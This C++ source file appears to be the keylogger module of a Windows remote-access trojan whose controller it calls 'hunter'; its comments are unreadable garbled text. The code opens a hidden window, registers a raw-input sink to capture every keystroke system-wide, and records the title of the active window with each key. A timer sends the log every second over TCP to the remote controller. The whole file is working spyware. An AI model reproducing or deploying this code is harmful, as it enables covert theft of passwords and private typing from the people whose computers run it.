#include "pch.h"
#include "Keybd.h"
#include "VirtualKeyToAscii.h"

// �˹ؼ������������� socket vector
static CRITICAL_SECTION gCs;
static Keybd gKbd; // ��ʼ����
static HWND hWnd = NULL; // ���ھ��
static std::vector<TcpSocket*> gSockets; // socket �б�
static std::vector<char> gBuffer; // �������ݻ�����

// �������ڲ�����ĳ���
// ���캯����һ��ʼ��ִ��
// ����ʱhunter����һ�������������
// ���Ը��߳�
Keybd::Keybd()
{
	// ��ʼ���ؼ���
	InitializeCriticalSection(&gCs);
	// �����Ի������ԭʼ�����豸��Ϣ
	createDialogByNewThread();
}

Keybd::~Keybd()
{
	if (hWnd) {
		// ɾ��socket
		const int max = gSockets.size();
		for (int i = 0; i < max; ++i) {
			gSockets.at(i)->dissconnect();
			delete gSockets.at(i);
		}
		// �رմ���
		DestroyWindow(hWnd);

	}
	// ɾ���ؼ���
	DeleteCriticalSection(&gCs);
}

void Keybd::startKeybd(std::string domain, int port)
{
	// �½����ӵ�hunter�˵�socket����
	TcpSocket* sock = new TcpSocket();
	if (!sock->connectTo(domain, port)) {
		delete sock;
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}

	OutputDebugStringA("Started keybd\r\n");
	// ����socket���������socket�б�
	addSocket(sock);

	OutputDebugStringA("Started keybd success\r\n" );
}

void Keybd::createDialogByNewThread()
{
	HANDLE h = CreateThread(NULL, 0, Keybd::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

// �̺߳���
DWORD Keybd::threadProc(LPVOID)
{
	// ����һ�����ɼ��Ĵ���������win32�¼�
	WORD tempMem[1024];
	LPDLGTEMPLATEA temp = (LPDLGTEMPLATEA)tempMem;
	temp->style = WS_CAPTION;
	temp->dwExtendedStyle = 0;
	temp->x = 0; temp->y = 0;
	temp->cx = 0; temp->cy = 0;
	int ret = DialogBoxIndirectParamA(NULL, temp, NULL, keybdWndProc, (LPARAM)NULL);

	if (ret == -1) {
		OutputDebugStringA("Failed to create dialog box for keybd\r\n");
	}

	return true;
}

// �����̴߳��ڹ��̴�����
BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uiMsg) {
	case WM_INITDIALOG: {
		// ע��ԭʼ�����豸 ��ʼ���������
		regist();
		// ʹ�ü�ʱ����ʱ���ͻ���ļ��̼�¼��Ϣ
		const int time = 1000;
		SetTimer(hWnd, 0, time, sendKeyboardData);
		break;
	}
	case WM_PAINT:
		// ���ش���
		ShowWindow(hWnd, SW_HIDE);
		break;
	case WM_INPUT: {
		getData(lParam);
	}
	default:
		break;
	}

	return false;
}

// ע��ԭʼ�豸
BOOL Keybd::regist() {
	// ���� RAWINPUTDEVICE �ṹ����Ϣ ָ��Ҫ��������
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK; // ��ʹ�������Ƕ��㴰��ҲҪ����
	rawinputDevice.hwndTarget = hWnd;

	// ע��ԭʼ�����豸
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		OutputDebugStringA("failed to register raw input devices\r\n");
		return FALSE;
	}

	return TRUE;
}

// ��ȡԭʼ��������
BOOL Keybd::getData(LPARAM lParam) {
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// ��ȡԭʼ�������ݵĴ�С
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> ��ͨ����    WM_SYSKEYDOWN --> ϵͳ����(ָ����ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// ��¼����
			saveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}

// ���水����Ϣ
void Keybd::saveKey(USHORT usVKey) {
	CHAR szKey[MAX_PATH] = { 0 };
	CHAR szTitle[MAX_PATH] = { 0 };
	CHAR szText[MAX_PATH] = { 0 };
	// ��ȡ���㴰��
	HWND hForegroundWnd = ::GetForegroundWindow();
	// ��ȡ���㴰�ڱ���
	::GetWindowTextA(hForegroundWnd, szTitle, 256);
	// ���������ת���ɶ�Ӧ��ASCII
	::lstrcpyA(szKey, getKeyName(usVKey));
	// ���찴����¼��Ϣ�ַ���
	::wsprintfA(szText, TEXT("[%s] %s\r\n"), szTitle, szKey);

	// ���水����Ϣ���໺����
	for (int i = 0; i < lstrlenA(szText); i++) {
		addBuffer(szText[i]);
	}
}

void Keybd::addSocket(TcpSocket* sock)
{
	EnterCriticalSection(&gCs);

	gSockets.push_back(sock);

	LeaveCriticalSection(&gCs);
}

std::vector<TcpSocket*> Keybd::getSockets()
{
	EnterCriticalSection(&gCs);

	std::vector<TcpSocket*> sockets = gSockets;

	LeaveCriticalSection(&gCs);

	return sockets;
}

void Keybd::delSocket(TcpSocket* sock)
{
	EnterCriticalSection(&gCs);

	std::vector<TcpSocket*>::iterator iter = gSockets.begin();
	for (; iter != gSockets.end(); ++iter) {
		if (*iter == sock) {
			gSockets.erase(iter);
			break;
		}
	}

	LeaveCriticalSection(&gCs);
}

void Keybd::addBuffer(char data)
{
	gBuffer.push_back(data);
}

void Keybd::delBuffer()
{
	gBuffer.clear();
}

void Keybd::sendKeyboardData(HWND, UINT, UINT, DWORD)
{
	if (gBuffer.size() > 0) {
		std::vector<TcpSocket*> sockets = getSockets();
		int max = sockets.size();
		for (int i = 0; i < max; ++i) {
			TcpSocket* sock = sockets.at(i);
			// ��socket�б��н�û�����ӵ�socketɾ��
			// �����ӵľͷ�������
			if (!sock->sendData(&gBuffer[0], gBuffer.size())) {
				delSocket(sock);

				delete sock;

				OutputDebugStringA("Finished keybd\r\n");
			}
		}
		// ÿ�ζ�Ҫ�������� ֻ����ʵʱ����
		delBuffer();
	}
}


